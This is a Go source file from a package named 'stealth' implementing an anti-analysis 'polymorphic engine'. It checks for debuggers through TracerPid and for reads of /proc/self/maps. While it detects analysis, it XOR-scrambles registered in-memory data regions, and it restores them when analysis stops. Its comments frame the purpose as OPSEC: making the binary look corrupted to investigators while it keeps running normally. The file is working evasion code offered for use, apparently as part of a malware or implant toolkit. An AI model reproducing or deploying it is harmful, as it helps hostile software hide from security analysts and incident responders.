package stealth

import (
	"crypto/rand"
	"fmt"
	"os"
	"sync"
	"syscall"
	"time"
)

// PolymorphicEngine handles runtime code mutation to defeat static and dynamic analysis.
//
// OPSEC rationale: When a debugger attaches or /proc/self/mem is read, the analyst
// sees XOR-mutated code sections that look like garbage. When analysis stops, the
// code is silently restored. The binary appears corrupted under investigation but
// runs perfectly when left alone.
//
// Limitations in Go: We cannot mutate arbitrary .text sections because the GC needs
// consistent stack maps. Instead, we mutate data segments (global byte slices used
// as lookup tables, embedded configs) and use mprotect to make code pages writable
// only when mutating non-code sections.
type PolymorphicEngine struct {
	mu            sync.Mutex
	mutated       bool
	regions       []*MutableRegion
	checkInterval time.Duration
	done          chan struct{}
	stopped       chan struct{} // closed when background goroutine exits
	xorKey        []byte
}

// MutableRegion represents a memory region we can mutate.
type MutableRegion struct {
	Original []byte // saved original content
	Current  []byte // pointer to the live data we mutate
	Mutated  bool
}

// NewPolymorphicEngine creates the engine with a random XOR key.
func NewPolymorphicEngine(checkInterval time.Duration) (*PolymorphicEngine, error) {
	key := make([]byte, 256)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("polymorphic: crypto/rand unavailable: %w", err)
	}

	return &PolymorphicEngine{
		checkInterval: checkInterval,
		done:          make(chan struct{}),
		stopped:       make(chan struct{}),
		xorKey:        key,
	}, nil
}

// RegisterRegion adds a byte slice to be mutated when analysis is detected.
// The slice must be a reference to mutable package-level data (not stack allocated).
func (pe *PolymorphicEngine) RegisterRegion(data []byte) {
	pe.mu.Lock()
	defer pe.mu.Unlock()

	original := make([]byte, len(data))
	copy(original, data)

	pe.regions = append(pe.regions, &MutableRegion{
		Original: original,
		Current:  data,
		Mutated:  false,
	})
}

// Start begins the analysis detection and mutation loop.
func (pe *PolymorphicEngine) Start() {
	go func() {
		defer close(pe.stopped)
		ticker := time.NewTicker(pe.checkInterval)
		defer ticker.Stop()

		for {
			select {
			case <-pe.done:
				return
			case <-ticker.C:
				// Check analysis indicators (lock-free reads of /proc)
				underAnalysis := isBeingTraced() || isProcBeingRead()
				if underAnalysis {
					pe.mutate()
				} else {
					pe.restore()
				}
			}
		}
	}()
}

// Stop halts the engine and restores all regions.
func (pe *PolymorphicEngine) Stop() {
	select {
	case <-pe.done:
	default:
		close(pe.done)
	}
	// Wait for the background goroutine to fully exit before restoring,
	// preventing a race where the goroutine mutates after our restore.
	<-pe.stopped
	pe.restore()
}

// mutate XOR-encrypts all registered regions in memory.
func (pe *PolymorphicEngine) mutate() {
	pe.mu.Lock()
	defer pe.mu.Unlock()

	if pe.mutated {
		return
	}

	for _, region := range pe.regions {
		if region.Mutated {
			continue
		}
		xorSlice(region.Current, pe.xorKey)
		region.Mutated = true
	}
	pe.mutated = true
}

// restore reverses the XOR mutation on all regions.
func (pe *PolymorphicEngine) restore() {
	pe.mu.Lock()
	defer pe.mu.Unlock()

	if !pe.mutated {
		return
	}

	for _, region := range pe.regions {
		if !region.Mutated {
			continue
		}
		// XOR is its own inverse — applying it again restores original
		xorSlice(region.Current, pe.xorKey)
		region.Mutated = false
	}
	pe.mutated = false
}

// isBeingTraced checks TracerPid in /proc/self/status.
func isBeingTraced() bool {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	// Fast scan for TracerPid field
	for i := 0; i < len(data)-12; i++ {
		if data[i] == 'T' && string(data[i:i+10]) == "TracerPid:" {
			// Skip whitespace/tab after colon
			j := i + 10
			for j < len(data) && (data[j] == ' ' || data[j] == '\t') {
				j++
			}
			// Read the PID value
			if j < len(data) && data[j] != '0' {
				return true // Non-zero TracerPid = being debugged
			}
			return false
		}
	}
	return false
}

// isProcBeingRead detects if something is actively reading our /proc entries.
// Checks atime on /proc/self/maps (commonly read by analysts and debuggers).
func isProcBeingRead() bool {
	var stat syscall.Stat_t
	if err := syscall.Stat("/proc/self/maps", &stat); err != nil {
		return false
	}

	// If maps was accessed in the last 2 seconds, someone is reading us.
	// Normal operation doesn't touch /proc/self/maps.
	now := time.Now().Unix()
	atime := stat.Atim.Sec
	return (now - atime) < 2
}

// xorSlice applies XOR with a repeating key to a byte slice in-place.
func xorSlice(data []byte, key []byte) {
	keyLen := len(key)
	if keyLen == 0 {
		return
	}
	for i := range data {
		data[i] ^= key[i%keyLen]
	}
}

// RotateXORKey generates a new random XOR key.
// All regions must be in restored state before calling this.
func (pe *PolymorphicEngine) RotateXORKey() {
	pe.mu.Lock()
	defer pe.mu.Unlock()

	if pe.mutated {
		return // can't rotate while mutated — would corrupt data
	}

	// Shred old key
	for i := range pe.xorKey {
		pe.xorKey[i] = 0
	}

	// Generate new key
	if _, err := rand.Read(pe.xorKey); err != nil {
		// crypto/rand failure: leave old key zeroed rather than use a weak fallback.
		// Caller should treat a subsequent mutate/restore as a no-op.
		return
	}
}

// MprotectRegion changes memory protection flags on a page-aligned region.
// Used internally to make read-only pages writable for mutation.
func MprotectRegion(addr uintptr, size int, prot int) error {
	pageSize := os.Getpagesize()
	alignedAddr := addr &^ uintptr(pageSize-1)
	alignedSize := size + int(addr-alignedAddr)

	_, _, errno := syscall.RawSyscall(
		syscall.SYS_MPROTECT,
		alignedAddr,
		uintptr(alignedSize),
		uintptr(prot),
	)
	if errno != 0 {
		return errno
	}
	return nil
}
